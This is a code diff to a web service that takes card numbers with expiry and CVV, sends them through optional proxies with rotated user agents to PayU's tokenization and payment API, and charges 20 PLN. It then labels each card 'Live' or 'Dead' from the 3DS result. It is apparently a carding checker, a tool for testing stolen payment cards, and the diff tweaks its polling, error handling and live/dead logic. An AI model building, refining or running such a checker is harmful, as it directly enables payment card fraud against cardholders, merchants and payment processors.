@@ -31,7 +31,7 @@ def _random_ua():
     ]
     return random.choice(versions)
 
-def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=8, delay=3):
+def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=8, delay=3.5):
     headers = {
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9',
@@ -64,7 +64,6 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # === LOGIK ASAL KAU DARI SINI ===
         if proxy_str:
             proxy_ip = proxy_str.split('@')[-1] if '@' in proxy_str else proxy_str
             yield f"data: {json.dumps({'type': 'log', 'msg': f'Connecting via Proxy -> {proxy_ip}', 'class': 'warn'})}\n\n"
@@ -128,13 +127,9 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
         json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': card_num, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
        
         r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
-        try:
-            token_data = r3.json()
-        except:
-            yield f"data: {json.dumps({'type': 'result', 'msg': 'Tokenization Failed', 'status': 'error'})}\n\n"
-            return
-
+        token_data = r3.json()
         card_token = token_data.get('value')
+
         if not card_token:
             err = token_data.get('error', {})
             err_msg = err.get('message', str(err)) if isinstance(err, dict) else str(err)
@@ -159,41 +154,23 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
             yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {err_desc}', 'status': 'error'})}\n\n"
             return
 
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Payment accepted by PayU. Waiting for Bank response...', 'class': 'success'})}\n\n"
-
         continue_url = pay_data.get('continueUrl', '')
         is_3ds = 'threeds' in continue_url
         if is_3ds:
-            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS Security protocol triggered. Polling bank status...', 'class': 'warn'})}\n\n"
-            final_status = _poll_status(session, order_id, token, ua, is_3ds=True, max_attempts=8, delay=3)
-        else:
-            final_status = _poll_status(session, order_id, token, ua, is_3ds=False, max_attempts=6, delay=3)
-
+            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS Security protocol triggered...', 'class': 'warn'})}\n\n"
+        
+        final_status = _poll_status(session, order_id, token, ua, is_3ds)
         category = final_status.get('category', '')
         value = final_status.get('value', '')
 
-        # === HASIL AKHIR DENGAN LOGIK BARU ===
         if category == 'SUCCESS':
-            msg = 'Payment Successful'
-            status = 'success'
-            three_ds = 'Dead'
-        elif category in ('TIMEOUT_POLL', 'IN_PROGRESS') or '3DS' in str(value).upper() or 'NOT_AUTHORIZED' in str(value).upper():
-            msg = 'Declined - 3DS Required'
-            status = 'error'
-            three_ds = 'Live'
-        elif category == 'ERROR':
-            msg = f'Payment declined: {value}'
-            status = 'error'
-            three_ds = 'Dead'
+            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment Successful', 'status': 'success', 'raw': final_status})}\n\n"
         else:
-            msg = f'{category}: {value}'
-            status = 'error'
-            three_ds = 'Dead'
-
-        yield f"data: {json.dumps({'type': 'result', 'msg': msg, 'status': status, '3DS': three_ds, 'raw': final_status})}\n\n"
+            msg = f'Payment declined: {value}' if value else f'{category}'
+            yield f"data: {json.dumps({'type': 'result', 'msg': msg, 'status': 'error', 'raw': final_status})}\n\n"
 
     except Exception as e:
-        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error', '3DS': 'Dead'})}\n\n"
+        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error'})}\n\n"
     finally:
         session.close()
 
@@ -205,6 +182,7 @@ async def check_card(
     proxy: str = Query(None)
 ):
     start_time = time.time()
+    
     parts = cc.split('|')
     if len(parts) != 4:
         raise HTTPException(status_code=400, detail="Format: cc|mm|yy|cvv")
@@ -238,18 +216,25 @@ async def check_card(
             "Amount": "20 PLN"
         })
 
+    raw = result.get('raw', {})
+    response_value = raw.get('value') or raw.get('category') or "UNKNOWN"
+    
+    # 3DS Logic yang lebih tepat
+    cat_upper = str(raw.get('category', '')).upper()
+    val_upper = str(raw.get('value', '')).upper()
+    is_live = any(x in val_upper or x in cat_upper for x in ["WARNING_CONTINUE", "3DS_REQUIRED", "CHALLENGE"])
+
     return JSONResponse(content={
         "Gateway": "PayU Payment",
         "CC": cc,
         "Result": result.get('msg'),
-        "Response": result.get('raw', {}).get('value') or result.get('raw', {}).get('category') or "UNKNOWN",
+        "Response": response_value,
         "Status": result.get('status'),
-        "3DS": result.get('3DS', 'Dead'),
+        "3DS": "Live" if is_live else "Dead",
         "Time": f"{elapsed}s",
         "Amount": "20 PLN"
     })
 
-# Streaming
 @app.get("/check/stream")
 async def check_card_stream(
     cc: str = Query(...),
